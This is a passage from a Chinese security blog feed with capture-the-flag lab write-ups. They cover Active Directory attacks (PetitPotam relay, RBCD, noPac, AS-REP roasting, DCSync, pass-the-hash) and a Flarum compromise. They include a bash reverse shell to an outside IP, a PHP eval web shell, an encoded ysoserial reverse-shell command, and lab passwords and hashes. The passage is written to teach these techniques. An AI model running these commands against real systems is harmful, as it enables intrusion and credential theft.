src="../images/image-20231025201701199.png" alt="image-20231025201701199"></strong></p><p><strong>默认情况下, WebClient 仅对本地内部网 (Local Intranet) 或受信任的站点 (Trusted Sites) 列表中的目标自动使用当前用户凭据进行 NTLM 认证</strong></p><p>扫描一下Petitpotam  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025201745549.png" alt="image-20231025201745549"></p><p>在奇安信的一篇文章中  总结了所有域强制认证的所有方法</p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a></p><p>这下子是三台机器存在Petitpotam这个服务了</p><p>以下是参考<a href="https://www.cnblogs.com/backlion/p/17187375.html">https://www.cnblogs.com/backlion/p/17187375.html</a>  这篇文章来进行编写的</p><p>这两个组合起来就会让人联想到一个攻击手法</p><p><strong>无ADCS + Petitpotam + ntlm中继打法</strong></p><p>攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD)</p><ul><li><p>条件 — 目标机器需要开启webclient服务</p></li><li><p>中继攻击手法</p></li></ul><blockquote><ul><li>实战中的中继打法只需要停掉80占用服务，开启端口转发（portfwd，CS在后续版本中添加了rportfwd_local，直接转发到客户端本地）</li><li>本次演示类似实战的打法，不选择把impacket丢到入口ubuntu上面这种操作</li></ul></blockquote><ol><li>中继攻击环境配置: 端口转发 + 代理<br>我们目前需要把服务器的80，转发到客户端本地的80</li></ol><p>直接上命令 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.248.175  -D 101.42.39.110:7777 -R \*:79:127.0.0.1:80</span><br><span class="line"></span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure><p>记得写公钥到getshell主机上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#自己的机器上</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">#弹的shell</span><br><span class="line">echo &quot;~/.ssh/id_rsa.pub的内容&quot; &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.248.175</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025203310301.png" alt="image-20231025203310301"></p><p><img src="../images/image-20231025203418194.png" alt="image-20231025203418194"></p><p><img src="../images/image-20231025203405384.png" alt="image-20231025203405384"></p><p>说明了成功将端口转发到本地了  我们直接使用本地来替代172.22.11.76这台机器</p><p>接着本地开启开启ntlmrelayx，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD，接着使用<a href="https://github.com/topotam/PetitPotam">Petitpotam</a>触发XR-LCM3AE8B认证到172.22.11.76</p><p><strong>(用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD))</strong></p><p>上面加黑的就是原理了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#x27;xr-desktop$&#x27; --delegate-access</span><br><span class="line">proxychains python3 PetitPotam.py -u yangmei -p &#x27;xrihGHgoNZQ&#x27; -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025204332096.png" alt="image-20231025204332096"></p><p><img src="../images/image-20231025204500404.png" alt="image-20231025204500404"></p><p><img src="../images/image-20231025204511857.png" alt="image-20231025204511857"></p><p><strong>成功使用PetitPotam这个方法   强制使26这台带有webclient的机器去访问 我们的中继服务(并且获取到的权限还将26这台机器的msDS-AllowedToActOnBehalfOfOtherIdentity 属性修改成45这台机器上  这样就变成了RBCD攻击)</strong></p><p>接下来申请ST直接去访问26这台机器就行了  <strong>(这里的hash值是之前在打上面45这台机器的时候导出的)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :0e1f6735dcf951891dbf20a4f0097423  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">sudo vim /etc/hosts#把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里</span><br></pre></td></tr></table></figure><p>然后无密码连接上去就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025205200436.png" alt="image-20231025205200436"></p><p>这样的话就拿下第三台机器了</p><p><img src="../images/image-20231025205303611.png" alt="image-20231025205303611"></p><p>拿下第三个flag</p><p>这里的话新创建个用户上去  mimikatz跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p>这里建议直接用管理员启动  这样方便点</p><p><img src="../images/image-20231025205857192.png" alt="image-20231025205857192"></p><p>抓取本地hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhanghui      1232126b24cdf8c9bd2f788a9d7c7ed1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025205951016.png" alt="image-20231025205951016"></p><p><img src="../images/image-20231025213428205.png" alt="image-20231025213428205"></p><p><strong>(这里不直接显示出来  不过不影响 这里就是说zhanghui是MA_Admin组的)</strong></p><p>这里的话说zhanghui是MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打noPac</p><p>(很是抽象)—————————————-noPac的话我写了一篇文章  感兴趣的话可以去搜来看看</p><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><p><strong>(记得就是把整个文件下载下来运行  不要单拿nopac.py出来运行  否则会报错)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025210806151.png" alt="image-20231025210806151"></p><p>属实一步到位   直接就新加用户然后改名打noPac</p><p>和rbcd是有点像的</p><p><img src="../images/image-20231025211006556.png" alt="image-20231025211006556"></p><p>这里的话不用那个新添加计算机也行  因为我们本来域中就有机器账户  并且我们还有权限来修改其属性  所以直接用<code>XR-DESKTOP.xiaorang.lab</code>这台机器就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/&#x27;XR-DESKTOP$&#x27; -hashes &#x27;:0e1f6735dcf951891dbf20a4f0097423&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name &#x27;XR-DESKTOP$&#x27; -old-hash &#x27;:0e1f6735dcf951891dbf20a4f0097423&#x27; -use-ldap -shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231025211319801.png" alt="image-20231025211319801"></p><p><img src="../images/image-20231025211533457.png" alt="image-20231025211533457"></p><p>题目给的提示</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先用fscan扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231025193232597.png&quot; alt=&quot;image-20231025193232597&quot;&gt;&lt;/p&gt;
&lt;p&gt;就只扫到一个8080  8009端口和一个后台管理系统 &lt;/p&gt;</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-NoPac</title>
    <link href="https://ke1nys.github.io/posts/4997e8ba.html"/>
    <id>https://ke1nys.github.io/posts/4997e8ba.html</id>
    <published>2023-10-24T10:07:42.000Z</published>
    <updated>2023-10-25T14:13:34.196Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/-meditation-/articles/16619406.html">参考文章1</a>   <a href="https://blog.csdn.net/weixin_44747030/article/details/127158385">参考文章2</a></p><p>这里是准备讲讲PAC的一个攻击手法 NoPac</p><p>这里是在打春秋云镜的<code>Spoofing</code>遇到的  刚好借此机会来学习一下</p><p><strong>(这里只讲原理  不操作  因为懒得搭建环境…………)</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首先PAC呢  在我们学习这个<a href="https://ke1nys.github.io/posts/1bedf17b.html#%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B">kerberos </a>协议的时候就遇到这个  就是在我们申请TGT票据的时候生成的</p><p>因为我们在申请TGS票据的时候  是不会验证我们是否有权限来访问该服务的  验证是否有权限来访问该服务的时候在我们拿着ST去申请访问的时候  验证的话就是靠我们TGS票据里的PAC</p><p>(TGS里的PAC是从TGT票据中复制过来的)</p><h2 id="漏洞及漏洞原理"><a href="#漏洞及漏洞原理" class="headerlink" title="漏洞及漏洞原理"></a>漏洞及漏洞原理</h2><p>CVE-2021-42278 &amp; CVE-2021-42287</p><ul><li><p>CVE-2021-42278， 机器用户应当是computer$的形式，但是实际并没有验证机器账号是否有$。导致机器用户名可以被模拟冒用。</p></li><li><p>CVE-2021-42287，Kerberos在处理UserName字段时，如果找不到 UserName 的话，KDC会继续查找 UserName$，如果还是查找不到的话，KDC会继续查找altSecurityIdentities属性的值的⽤户。正是因为这个处理逻辑，导致了漏洞的产⽣。触发这个点有两种方式</p><ul><li>跨域请求：跨域请求时，⽬标域活动⽬录数据库是找不到其他域的⽤户的，因此会⾛进这个 处理UserName的逻辑。</li><li>修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不到⽤户，然后⾛进这个处理UserName的逻辑。</li></ul><p>但是这还是不够，仅仅让KDC⾛进这个处理UserName的逻辑，还不能伪造⾼权限。因为票据中代表⽤户身份权限是数据块是PAC。⽽TGT认购权证中的PAC是根据预认证身份信息⽣成的，这个我们⽆法伪造。因此得想办法在ST服务票据中进⾏伪造。⽽正常的ST服务票据中的PAC是直接拷⻉TGT认购权证中的。因此，得想办法让KDC在TGS-REP的时候重新⽣成PAC，⽽不是拷⻉TGT票据中的PAC。这⾥也有两种⽅式：</p><ul><li>S4U2Self请求：KDC在处理S4U2Self类型的TGS-REQ请求时，PAC是重新⽣成的。</li><li>跨域⽆PAC的TGT票据进⾏TGS请求：KDC在处理跨域的TGS-REQ请求时，如果携带的TGT认购权证中没有PAC，PAC会重新⽣成。</li></ul></li></ul><p><strong>(这里为什么S4U2Self请求是会重新生成PAC的原因)</strong></p><blockquote><p>S4U2Self  是替代用户去请求TGS票据  不是代表客户端去请求票据</p></blockquote><h2 id="纸上操作"><a href="#纸上操作" class="headerlink" title="纸上操作"></a>纸上操作</h2><ul><li>域机器账户  PC1$</li><li>域控 DC$</li></ul><p>先简单讲一下流程  就是我们先去修改saMAccountName为DC  然后就去请求TGT票据  然后再修改回PC1$  然后使用S4U2Self去申请TGS票据  在KDC验证PAC的时候  因为找不到DC用户  然后就会去找DC$用户  然后找到了  就说明我们用的是域控机器的TGT票据  然后就可以伪造域管去获取TGS了 <strong>(并且重新生了PAC  ———-   是域管的)</strong></p><p><strong>(注意一下  替代用户去申请的TGS票据的时候  替代的用户一定是存在且允许的  不然会失败)</strong></p><p><strong>(下面用的命令可能有点乱  但是咱重要看的是思路  理解后稍微改改就行了)</strong></p><ul><li>第一步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name &#x27;9z1nc$&#x27; -new-name &#x27;OWA2010CN-god&#x27; -dc-ip 192.168.3.21 &#x27;god.com/mary:admin!@#45&#x27;</span><br><span class="line"></span><br><span class="line">//改名</span><br></pre></td></tr></table></figure><ul><li>第二步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:&quot;r-dc&quot; /password:&quot;1qaz@WSX&quot; /domain:&quot;hacker.lab&quot; /dc:&quot;r-dc.hacker.lab&quot; /nowrap</span><br><span class="line"></span><br><span class="line">//申请TGT票据</span><br></pre></td></tr></table></figure><ul><li>第三步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name &#x27;OWA2010CN-God&#x27; -new-name &#x27;9z1nc$&#x27; -dc-ip 192.168.3.21 &#x27;god.com/mary:admin!@#45&#x27;</span><br><span class="line"></span><br><span class="line">//该回原来的名字</span><br></pre></td></tr></table></figure><ul><li>第四步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;administrator&quot; /altservice:&quot;ldap/r-dc.hacker.lab&quot; /dc:&quot;r-dc.hacker.lab&quot; /ptt /ticket:base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用s4u协议去申请TGS票据</span><br></pre></td></tr></table></figure><p><strong>然后最后就成功了  这样的话我们就可以拥有域管的权限了</strong></p><p>一般来说noPAC.py工具的话 就可以一步到位了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/-meditation-/articles/16619406.html&quot;&gt;参考文章1&lt;/a&gt;   &lt;a href=&quot;https://blog.csdn.net/weixin_44747030/article/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Flarum</title>
    <link href="https://ke1nys.github.io/posts/dab11f8.html"/>
    <id>https://ke1nys.github.io/posts/dab11f8.html</id>
    <published>2023-10-24T07:30:16.000Z</published>
    <updated>2023-10-25T14:13:34.197Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一波</p><p><img src="../images/image-20231024153826631.png" alt="image-20231024153826631"></p><p>一个80端口</p><p><img src="../images/image-20231024153856241.png" alt="image-20231024153856241"></p><p>这个登录的话是不需要进行验证码或者别的验证东西  所以我们可以进行爆破·</p><p>用那个rockyou.txt就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator::1chris</span><br></pre></td></tr></table></figure><p>爆破出密码后进行登录后台</p><p><img src="../images/image-20231024154244192.png" alt="image-20231024154244192"></p><p>这个cms的话其实就是跟题目给的名字是一样的  <code>Flarum</code></p><p>直接去找洞就行了</p><p>这里用p牛的一篇文章来参考</p><p><a href="https://tttang.com/archive/1714/#toc_0x02-css">https://tttang.com/archive/1714/#toc_0x02-css</a></p><p>先下载一个<code>phpggc</code>  <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a>  就是php版的yso</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -p tar -b Monolog/RCE6 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure><p>编译成功后会生成一大堆base64代码，复制过来，在后台修改css那里替换下面代码的xxx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import (inline) &#x27;data:text/css;base64,xxx&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024154602503.png" alt="image-20231024154602503"></p><p>保存之后 开启监听  并且重新写一个css进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.test &#123;</span><br><span class="line">    content: data-uri(&#x27;phar://./assets/forum.css&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024154735633.png" alt="image-20231024154735633"></p><p><img src="../images/image-20231024154752600.png" alt="image-20231024154752600"></p><p>低权限  估计要提权拿flag了  先弹个马到msf上</p><p><strong>(这里用的是capabilities   这个的话就是将权限更加细分了而已  不在一股脑除了root就是www-data)</strong></p><p>查看cap权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024155716923.png" alt="image-20231024155716923"></p><p>这个openssl我们可以利用  (flag文件位置已知)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -in &quot;/root/flag/flag01.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024160235538.png" alt="image-20231024160235538"></p><p>接下来就是扫内网挂代理了</p><p><img src="../images/image-20231024160255260.png" alt="image-20231024160255260"></p><p><img src="../images/image-20231024160531332.png" alt="image-20231024160531332"></p><p>整理信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.60.52    getshell </span><br><span class="line"></span><br><span class="line">172.22.60.42        3389   XIAORANG\FILESERVER   (文件服务)</span><br><span class="line"></span><br><span class="line">172.22.60.8          3389   DC XIAORANG\DC</span><br><span class="line"></span><br><span class="line">172.22.60.15          3389  XIAORANG\PC1</span><br></pre></td></tr></table></figure><p>收集完信息后  没有思路了  回去到刚刚获取到的shell的主机上看看  有没有数据库或者啥重要的信息</p><p><img src="../images/image-20231024161012031.png" alt="image-20231024161012031"></p><p>在网站目录下复现一个config.php的配置文件  里面有数据库  但是只能本地连接  我们上传个<code>adminer.php</code>上去</p><p>写个马用蚁剑传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024161321915.png" alt="image-20231024161321915"></p><p>试了一下 发现只有assets是我们有权限写文件进去的</p><p><img src="../images/image-20231024161532024.png" alt="image-20231024161532024"></p><p><img src="../images/image-20231024161633166.png" alt="image-20231024161633166"></p><p>我们将这个表里的内容全部以csv的格式导出  然后execl打开  然后我们就能提取到email这个列的所有数据了</p><p>这个盲猜一手 AS-REP Roasting</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip 172.22.60.8  xiaorang.lab/ -usersfile flarum_users.txt</span><br><span class="line"></span><br><span class="line">//这里写域控ip是因为申请tgt票据的时候我们是像域控申请的</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024162034987.png" alt="image-20231024162034987"></p><p>这里返回的hash值是session_key的  我们能爆破出用户的密码是因为这个session_key是由用户的密码hash值进行加密的</p><p>然后使用hashcat进行爆破(只爆破出了一个)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 --force 1.txt rockyou.txt</span><br></pre></td></tr></table></figure><p><code>wangyun@XIAORANG.LAB::Adm12geC</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.60.15 -u wangyun -p Adm12geC -d xiaorang.lab</span><br><span class="line"></span><br><span class="line">//测试一下密码是否可靠</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024162317361.png" alt="image-20231024162317361"></p><p>并且这个ip还开了3389端口  尝试rdp</p><p><img src="../images/image-20231024162525165.png" alt="image-20231024162525165"></p><p>卓面上有个xshell 但是只能知道用户名  却不知道密码</p><p>使用<a href="https://github.com/JDArmy/SharpXDecrypt/">https://github.com/JDArmy/SharpXDecrypt/</a> 这个工具  可以帮助我们获取到这个zhangxin用户的密码</p><p><img src="../images/image-20231024162715933.png" alt="image-20231024162715933"></p><p>获取到了该密码</p><p><img src="../images/image-20231024162753044.png" alt="image-20231024162753044"></p><p>在域内</p><p><img src="../images/image-20231024162846936.png" alt="image-20231024162846936"></p><p>并且还是*Account Operators这个组的成员 </p><p><img src="../images/image-20231024162919468.png" alt="image-20231024162919468"></p><p>还是这个电脑的用户</p><p>用sharphound.exe跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -c all -ns 172.22.60.8 --zip --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231024163117214.png" alt="image-20231024163117214"></p><p>这下思路就清晰了 </p><p>这里可以发现zhangxin用户属于<strong>Acount Operators</strong>, 因此对域内非域控的所有机器都具有GenericAll权限</p><p>所以这里就可以打<code>RBCD</code>了</p><p>接下来三步走就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 addcomputer.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 rbcd.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -action write -delegate-to &#x27;FILESERVER$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/FILESERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure><p>这里话我们就获取到FILESERVER$这个机器的TGT票据了</p><p>然后直接注入本地来无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure><p>修改/etc/hosts  不然等会域名解析会失败</p><p><img src="../images/image-20231024163431538.png" alt="image-20231024163431538"></p><p>然后无密码登录到FILESERVER$这个机器上  并且是system权限的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk</span><br></pre></td></tr></table></figure><p>然后就能拿flag了  然后因为这个FILESERVER$具有<code>DCSync</code>权限  </p><p>(因为我们是system权限了  所以我们能导出这台机器的本地hash值)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8</span><br><span class="line"></span><br><span class="line">//类似于mimikatz的logonpasswords</span><br></pre></td></tr></table></figure><p>获取到了这台机器的hash值后  我们还是用上面的脚本  只不过这次是<code>DCSync</code>了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/&#x27;Fileserver$&#x27;:@172.22.60.8 -hashes &#x27;:951d8a9265dfb652f42e5c8c497d70dc&#x27; -just-dc-user Administrator</span><br></pre></td></tr></table></figure><p>获取到域控hash之后  直接PTH打域控和其他机器了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8 -codec gbk</span><br><span class="line"></span><br><span class="line">//域控</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15 -codec gbk</span><br><span class="line"></span><br><span class="line">//PC1</span><br></pre></td></tr></table></figure><p>结束了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231024153826631.png&quot; alt=&quot;image-20231024153826631&quot;&gt;&lt;/p&gt;
&lt;p&gt;一个80端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Delivery</title>
    <link href="https://ke1nys.github.io/posts/a3698f4a.html"/>
    <id>https://ke1nys.github.io/posts/a3698f4a.html</id>
    <published>2023-10-20T12:29:38.000Z</published>
    <updated>2023-10-20T14:12:45.767Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一下ip</p><p><img src="../images/image-20231020203451556.png" alt="image-20231020203451556"></p><p>存在一个ftp匿名登录 </p><p>1.txt中没有东西   pom.xml中有一个xstream的低版本漏洞</p><p><img src="../images/image-20231020203643428.png" alt="image-20231020203643428"></p><p><a href="https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md</a></p><p>在你的vps上开放1099端口，然后用yso起一下服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 